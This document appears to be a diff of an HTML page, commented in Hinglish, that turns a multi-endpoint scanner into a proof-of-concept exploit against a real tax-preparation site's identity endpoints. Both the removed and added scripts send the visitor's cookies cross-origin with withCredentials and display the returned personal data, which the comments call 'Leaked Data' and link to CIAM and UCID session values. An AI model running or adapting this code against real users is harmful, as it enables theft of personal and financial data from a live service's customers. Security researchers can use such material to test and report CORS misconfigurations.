@@ -18,43 +18,31 @@
     
     <div id="results"></div>
 
-    <script>
-        // In endpoints ko hum scan karenge
-        const endpoints = [
-    "https://mp.hrblock.com/idl/hrb/idl",
-    "https://mp.hrblock.com/idl/hrb/user",
-    "https://mp.hrblock.com/idl/hrb/registration",
-    "https://mp.hrblock.com/idl/hrb/spruceLogin",
-    "https://mp.hrblock.com/idl/hrb/ciam_id"
-];
+<script>
+    function fetchSensitiveData() {
+        // Hum ab us endpoint ko target kar rahe hain jahan PII leakage ka risk hai
+        var target_url = "https://mp.hrblock.com/idl/hrb/idl";
+        var xhr = new XMLHttpRequest();
 
+        xhr.open("GET", target_url, true);
+        
+        // YE SABSE IMPORTANT LINE HAI:
+        // Isse browser victim ki cookies (CIAM, UCID) server ko bhejta hai
+        xhr.withCredentials = true; 
 
-        function startScan() {
-            const resultsDiv = document.getElementById("results");
-            resultsDiv.innerHTML = ""; // Clear old results
-
-            endpoints.forEach(url => {
-                var xhr = new XMLHttpRequest();
-                xhr.open("GET", url, true);
-                xhr.withCredentials = true; // Cookies use karne ke liye
-
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState == 4) {
-                        const div = document.createElement("div");
-                        div.className = "box";
-                        
-                        if (xhr.status == 200) {
-                            div.innerHTML = `<span class="success">[FOUND] URL: ${url}</span><br>Data: ${xhr.responseText}`;
-                            console.log("Success on: " + url);
-                        } else {
-                            div.innerHTML = `<span class="failed">[FAILED] URL: ${url}</span> (Status: ${xhr.status})`;
-                        }
-                        resultsDiv.appendChild(div);
-                    }
-                };
-                xhr.send();
-            });
-        }
-    </script>
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+                var response = JSON.parse(xhr.responseText);
+                
+                // Hum response mein specifically CIAM aur UCID dhoondh rahe hain
+                document.getElementById("data").innerHTML = "Leaked Data: " + JSON.stringify(response, null, 2);
+                
+                console.log("Full Leak:", response);
+            }
+        };
+        xhr.send();
+    }
+</script>
+ 
 </body>
 </html>
